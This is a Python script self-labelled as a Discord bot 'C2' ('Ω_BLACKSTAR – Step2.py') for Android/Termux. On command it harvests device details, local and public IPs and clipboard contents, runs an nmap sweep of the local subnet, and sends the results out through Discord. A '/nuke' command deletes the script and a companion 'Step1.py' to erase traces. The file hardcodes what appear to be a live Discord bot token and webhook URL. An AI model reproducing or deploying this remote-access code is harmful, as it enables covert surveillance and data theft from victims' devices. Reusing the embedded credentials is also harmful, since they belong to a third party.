import os
import sys
import time
import json
import subprocess
import re
import asyncio
from datetime import datetime

# ============================================================
# COLORS
# ============================================================
R = '\033[31m'
G = '\033[1;32m'
O = '\033[33m'
B = '\033[34m'
C = '\033[36m'
W = '\033[0m'

# ============================================================
# CONFIGURATION
# ============================================================
DISCORD_TOKEN = "MTUyMDM5MDQ4MTUzMDQ1ODMwMw.G89-6r.qA-a1XDdbc_EK8a-V5AotAElTcFoko5vPioAEM"
WEBHOOK_URL = "https://discord.com/api/webhooks/1518322013335191733/aLTB-Fq-N4OEpwkR1YFxlBo_RLxf6KCiPFxvz_UxMhn2rlmqMdkZ3_2orFKIAadD0pj6"
BLOCKLIST_FILE = os.path.expanduser("~/.step2_blocked.txt")
# ============================================================

# ============================================================
# INSTALL DEPENDENCIES
# ============================================================
def install_dependencies():
    """Install required Python packages."""
    try:
        import discord
        import requests
        return True
    except ImportError:
        print(f"{C}[*] Installing required packages...{W}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "discord.py", "requests"])
        return True

install_dependencies()

import discord
from discord.ext import commands
import requests

# ============================================================
# BLOCKLIST FUNCTIONS
# ============================================================
def get_public_ip():
    """Get public IP address."""
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=5)
        return r.json().get("ip", "unknown")
    except:
        return "unknown"

def is_ip_blocked():
    """Check if the current IP is in the blocklist."""
    if not os.path.exists(BLOCKLIST_FILE):
        return False
    try:
        with open(BLOCKLIST_FILE, "r") as f:
            blocked = f.read().splitlines()
        return get_public_ip() in blocked
    except:
        return False

def block_current_ip():
    """Add the current IP to the blocklist."""
    try:
        ip = get_public_ip()
        with open(BLOCKLIST_FILE, "a") as f:
            f.write(ip + "\n")
        return True
    except:
        return False

# ============================================================
# HELPER FUNCTIONS
# ============================================================
def get_local_ip():
    """Get local IP using ifconfig."""
    try:
        result = subprocess.run(["ifconfig"], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if "inet " in line and "127.0.0.1" not in line:
                parts = line.strip().split()
                for i, part in enumerate(parts):
                    if part == "inet" and i + 1 < len(parts):
                        return parts[i + 1]
        return None
    except:
        return None

def run_nmap_scan(ip):
    """Run nmap scan and return results."""
    if not ip:
        return "No IP provided"
    subnet = ".".join(ip.split(".")[:3]) + ".0/24"
    try:
        result = subprocess.run(
            ["nmap", "-sn", subnet],
            capture_output=True, text=True, timeout=60
        )
        return result.stdout if result.stdout else "No devices found"
    except:
        return "Nmap scan failed"

def get_clipboard():
    """Get clipboard content via termux-clipboard-get."""
    try:
        result = subprocess.run(
            ["termux-clipboard-get"],
            capture_output=True, text=True, timeout=5
        )
        return result.stdout.strip() if result.returncode == 0 else None
    except:
        return None

def get_device_info():
    """Collect device information."""
    info = {
        "model": os.popen("getprop ro.product.model 2>/dev/null").read().strip() or "Unknown",
        "android": os.popen("getprop ro.build.version.release 2>/dev/null").read().strip() or "Unknown",
        "hostname": os.uname().nodename,
        "user": os.getenv("USER") or "unknown",
        "cwd": os.getcwd(),
        "timestamp": datetime.now().isoformat()
    }
    return info

# ============================================================
# DISCORD BOT
# ============================================================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"{G}[+] Bot logged in as {bot.user}{W}")
    try:
        synced = await bot.tree.sync()
        print(f"{G}[+] Synced {len(synced)} slash commands{W}")
    except Exception as e:
        print(f"{R}[!] Sync error: {e}{W}")

@bot.tree.command(name="info", description="Get device information")
async def slash_info(interaction: discord.Interaction):
    """Slash command: /info – returns device info."""
    await interaction.response.defer()
    info = get_device_info()
    local_ip = get_local_ip()
    public_ip = get_public_ip()
    clipboard = get_clipboard()

    embed = discord.Embed(
        title="📱 Device Information",
        color=discord.Color.blue(),
        timestamp=datetime.now()
    )
    embed.add_field(name="Model", value=info["model"], inline=True)
    embed.add_field(name="Android", value=info["android"], inline=True)
    embed.add_field(name="Hostname", value=info["hostname"], inline=True)
    embed.add_field(name="User", value=info["user"], inline=True)
    embed.add_field(name="Local IP", value=local_ip or "Not found", inline=True)
    embed.add_field(name="Public IP", value=public_ip or "Not found", inline=True)
    embed.add_field(name="Clipboard", value=clipboard[:500] or "Empty", inline=False)
    embed.set_footer(text=f"Step2.py | {info['timestamp']}")

    await interaction.followup.send(embed=embed)

@bot.tree.command(name="scan", description="Run network scan (nmap)")
async def slash_scan(interaction: discord.Interaction):
    """Slash command: /scan – runs nmap scan."""
    await interaction.response.defer()
    local_ip = get_local_ip()
    if not local_ip:
        await interaction.followup.send("❌ Could not determine local IP.")
        return
    result = run_nmap_scan(local_ip)
    await interaction.followup.send(f"📡 **Nmap Scan Results**\n```\n{result[:1900]}\n```")

@bot.tree.command(name="clipboard", description="Get clipboard content")
async def slash_clipboard(interaction: discord.Interaction):
    """Slash command: /clipboard – returns clipboard content."""
    await interaction.response.defer()
    clipboard = get_clipboard()
    if clipboard:
        await interaction.followup.send(f"📋 **Clipboard Content**\n```\n{clipboard[:1900]}\n```")
    else:
        await interaction.followup.send("📋 Clipboard is empty or inaccessible.")

@bot.tree.command(name="ping", description="Check bot latency")
async def slash_ping(interaction: discord.Interaction):
    """Slash command: /ping – checks bot latency."""
    latency = round(bot.latency * 1000)
    await interaction.response.send_message(f"🏓 Pong! Latency: {latency}ms")

@bot.tree.command(name="nuke", description="Self-destruct and wipe all traces")
async def slash_nuke(interaction: discord.Interaction):
    """Slash command: /nuke – triggers self-destruct."""
    await interaction.response.send_message("💀 **Self-destruct sequence initiated...**")
    # Send final confirmation via webhook
    try:
        requests.post(WEBHOOK_URL, json={"content": "💀 **Step2.py self-destruct initiated**"})
    except:
        pass
    # Block IP
    block_current_ip()
    # Delete this script and Step1.py
    try:
        os.remove(os.path.abspath(sys.argv[0]))
    except:
        pass
    try:
        os.remove("Step1.py")
    except:
        pass
    # Exit
    os._exit(0)

# ============================================================
# START BOT
# ============================================================
def run_bot():
    try:
        bot.run(DISCORD_TOKEN)
    except Exception as e:
        print(f"{R}[!] Bot error: {e}{W}")

# ============================================================
# MAIN
# ============================================================
def main():
    print(f"\n{C}{'='*60}{W}")
    print(f"{C}Ω_BLACKSTAR – Step2.py Discord Bot C2{W}")
    print(f"{C}{'='*60}{W}\n")

    if is_ip_blocked():
        print(f"{R}[!] IP blocked. Exiting.{W}")
        sys.exit(1)

    print(f"{G}[+] Starting Discord bot...{W}")
    run_bot()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Interrupted.{W}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{R}[!] Fatal error: {e}{W}")
        sys.exit(1)
